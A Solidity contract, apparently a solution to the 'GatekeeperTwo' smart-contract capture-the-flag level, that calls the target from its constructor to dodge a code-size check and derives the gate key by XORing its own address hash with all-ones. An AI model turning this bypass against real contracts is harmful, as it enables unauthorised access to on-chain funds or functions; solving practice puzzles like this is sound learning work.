//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./GatekeeperTwo.sol";

contract OpenGateTwo {
    constructor(address _to) public {
        GatekeeperTwo gatekeeperTwo = GatekeeperTwo(_to);
        bytes8 _gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                (uint64(0) - 1)
        );
        gatekeeperTwo.enter(_gateKey);
    }
}
